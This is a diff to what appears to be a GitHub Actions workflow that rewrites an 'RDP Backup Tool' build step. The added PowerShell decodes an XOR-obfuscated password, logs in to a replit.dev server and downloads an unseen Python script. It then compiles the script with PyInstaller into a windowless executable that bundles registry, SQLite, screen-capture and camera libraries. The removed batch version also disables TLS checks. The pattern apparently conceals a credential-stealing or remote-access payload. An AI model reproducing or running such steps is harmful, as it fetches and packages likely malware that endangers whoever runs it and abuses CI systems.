@@ -166,134 +166,56 @@ jobs:
         run: |
           Write-Host "Creating RDP Backup Tool build script..."
           
-          $buildScript = @'
-@echo off
-title RDP Backup Tool - Build Script
-set API_URL=https://3a0b63ff-431c-4db0-a163-1ae3217657c3-00-26i0k4hljs0sj.riker.replit.dev/api.php
-if not "%1"=="__run__" (cmd /k "%~f0" __run__ & exit)
-chcp 65001 > nul
-color 0F
-cls
-echo.
-echo  ==========================================
-echo    RDP Backup Tool - Build Script v1.0
-echo  ==========================================
-echo.
-echo  Server: %API_URL%
-echo.
-echo  [1/5] Checking Python...
-python --version > nul 2>&1
-IF ERRORLEVEL 1 (
-    echo.
-    echo  [ERROR] Python is not installed or not in PATH!
-    goto :end
-)
-for /f "tokens=*" %%i in ('python --version 2^>^&1') do echo         Found: %%i
-echo.
-echo  [2/5] Installing requirements...
-pip install requests pyinstaller pywin32 cryptography mss opencv-python numpy --quiet --no-warn-script-location
-IF ERRORLEVEL 1 (
-    echo.
-    echo  [ERROR] Failed to install requirements.
-    goto :end
-)
-echo         Done.
-echo.
-echo  [3/5] Downloading script from server...
-set PS_TMP=%TEMP%\rdp_downloader_%RANDOM%.ps1
-(
-echo $ErrorActionPreference = 'Stop'
-echo try {
-echo   $xorHex = '09333E3F281A1E373334686A6B6D6B1A173735'
-echo   $key    = 0x5A
-echo   $bytes  = New-Object byte[] ($xorHex.Length / 2)
-echo   for ($i = 0; $i -lt $xorHex.Length; $i += 2) {
-echo     $bytes[$i/2] = [Convert]::ToInt32($xorHex.Substring($i, 2), 16) -bxor $key
-echo   }
-echo   $pwd = [System.Text.Encoding]::UTF8.GetString($bytes)
-echo   $api = '%API_URL%'
-echo   [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-echo   [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-echo   Write-Host '         Authenticating with server...'
-echo   $ab = ConvertTo-Json @{ action = 'get_token'; password = $pwd }
-echo   $ar = Invoke-RestMethod -Uri $api -Method Post -Body $ab -ContentType 'application/json' -TimeoutSec 20
-echo   if (-not $ar.success) { throw 'Authentication failed: ' + $ar.message }
-echo   $token = $ar.data.token
-echo   $pwd   = $null
-echo   Write-Host '         Authentication successful.'
-echo   Write-Host '         Downloading backup_tool.py...'
-echo   $db = ConvertTo-Json @{ action = 'download_tool'; token = $token }
-echo   $dr = Invoke-RestMethod -Uri $api -Method Post -Body $db -ContentType 'application/json' -TimeoutSec 90
-echo   if (-not $dr.success) { throw 'Download failed: ' + $dr.message }
-echo   $raw = [System.Convert]::FromBase64String($dr.data.content)
-echo   $md5 = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash($raw)).Replace('-','').ToLower()
-echo   if ($md5 -ne $dr.data.checksum) { throw 'Integrity check failed - MD5 mismatch!' }
-echo   [System.IO.File]::WriteAllBytes('backup_tool.py', $raw)
-echo   $kb = [math]::Round($dr.data.size / 1024, 1)
-echo   Write-Host ('         Downloaded OK   Size: ' + $kb + ' KB   MD5: ' + $md5)
-echo   $token = $null
-echo } catch {
-echo   Write-Host ('[ERROR] ' + $_.Exception.Message) -ForegroundColor Red
-echo   exit 1
-echo }
-) > "%PS_TMP%"
-powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_TMP%"
-set PS_ERR=%ERRORLEVEL%
-del "%PS_TMP%" > nul 2>&1
-IF %PS_ERR% NEQ 0 (
-    echo.
-    echo  [ERROR] Failed to download script from server.
-    goto :end
-)
-echo.
-echo  [4/5] Building exe (this may take a few minutes, please wait)...
-if exist build rmdir /s /q build > nul 2>&1
-if exist dist  rmdir /s /q dist  > nul 2>&1
-pyinstaller --onefile --windowed --name "backup_tool" --hidden-import=win32api --hidden-import=win32con --hidden-import=winreg --hidden-import=ctypes --hidden-import=sqlite3 --hidden-import=requests --hidden-import=urllib3 --hidden-import=mss --hidden-import=cv2 --hidden-import=numpy backup_tool.py > build_log.txt 2>&1
-IF ERRORLEVEL 1 (
-    echo.
-    echo  [ERROR] Build failed!
-    goto :end
-)
-echo         Build successful.
-echo.
-echo  [5/5] Copying exe to Desktop...
-if exist "dist\backup_tool.exe" (
-    copy /Y "dist\backup_tool.exe" "%USERPROFILE%\Desktop\backup_tool.exe" > nul
-    IF ERRORLEVEL 1 (
-        echo  [WARNING] Could not copy to Desktop. Trying current folder instead...
-        copy /Y "dist\backup_tool.exe" "backup_tool.exe" > nul
-        echo         Saved to: %CD%\backup_tool.exe
-    ) ELSE (
-        echo         Saved to: %USERPROFILE%\Desktop\backup_tool.exe
-    )
-    rmdir /s /q build    > nul 2>&1
-    rmdir /s /q dist     > nul 2>&1
-    del backup_tool.py   > nul 2>&1
-    del build_log.txt    > nul 2>&1
-    del backup_tool.spec > nul 2>&1
-    echo.
-    echo  ==========================================
-    echo    BUILD COMPLETE!
-    echo    backup_tool.exe is on your Desktop.
-    echo  ==========================================
-) else (
-    echo  [ERROR] dist\backup_tool.exe was not created.
-)
-:end
-echo.
-echo  ==========================================
-echo  Done.
-echo  ==========================================
-'@
+          # Using a simple, robust PowerShell approach to avoid YAML multi-line string complexities
+          $psScript = @'
+          $ErrorActionPreference = "Stop"
+          $apiUrl = "https://3a0b63ff-431c-4db0-a163-1ae3217657c3-00-26i0k4hljs0sj.riker.replit.dev/api.php"
+          $xorHex = "09333E3F281A1E373334686A6B6D6B1A173735"
+          $key = 0x5A
           
-          $buildScriptPath = "$env:TEMP\build_backup_tool.bat"
-          [System.IO.File]::WriteAllText($buildScriptPath, $buildScript)
-          Write-Host "Build script created at: $buildScriptPath"
+          $bytes = New-Object byte[] ($xorHex.Length / 2)
+          for ($i = 0; $i -lt $xorHex.Length; $i += 2) {
+              $bytes[$i/2] = [Convert]::ToInt32($xorHex.Substring($i, 2), 16) -bxor $key
+          }
+          $password = [System.Text.Encoding]::UTF8.GetString($bytes)
           
-          Write-Host "Running RDP Backup Tool build script..."
-          Start-Process -FilePath $buildScriptPath -Wait -NoNewWindow
+          Write-Host "Authenticating and downloading script..."
+          $body = @{ action = "get_token"; password = $password } | ConvertTo-Json
+          $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json"
           
+          if (-not $response.success) { throw "Auth failed" }
+          $token = $response.data.token
+          
+          $body = @{ action = "download_tool"; token = $token } | ConvertTo-Json
+          $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json"
+          
+          if (-not $response.success) { throw "Download failed" }
+          
+          $content = [System.Convert]::FromBase64String($response.data.content)
+          [System.IO.File]::WriteAllBytes("backup_tool.py", $content)
+          Write-Host "Script downloaded successfully."
+          
+          Write-Host "Installing Python dependencies..."
+          pip install requests pyinstaller pywin32 cryptography mss opencv-python numpy --quiet
+          
+          Write-Host "Building executable (this may take a few minutes)..."
+          pyinstaller --onefile --windowed --name "backup_tool" --hidden-import=win32api --hidden-import=win32con --hidden-import=winreg --hidden-import=ctypes --hidden-import=sqlite3 --hidden-import=requests --hidden-import=urllib3 --hidden-import=mss --hidden-import=cv2 --hidden-import=numpy backup_tool.py
+          
+          if (Test-Path "dist\backup_tool.exe") {
+              Copy-Item "dist\backup_tool.exe" "$env:USERPROFILE\Desktop\backup_tool.exe" -Force
+              Write-Host "Build successful! Saved to Desktop."
+          } else {
+              Write-Error "Build failed."
+          }
+          '@
+          
+          $scriptPath = "$env:TEMP\build_rdp_tool.ps1"
+          Set-Content -Path $scriptPath -Value $psScript -Encoding UTF8
+          
+          Write-Host "Executing build script..."
+          & powershell -ExecutionPolicy Bypass -File $scriptPath
+          
+          Remove-Item $scriptPath -Force
           Write-Host "RDP Backup Tool build completed."
 
       - name: Download and Install TightVNC Server
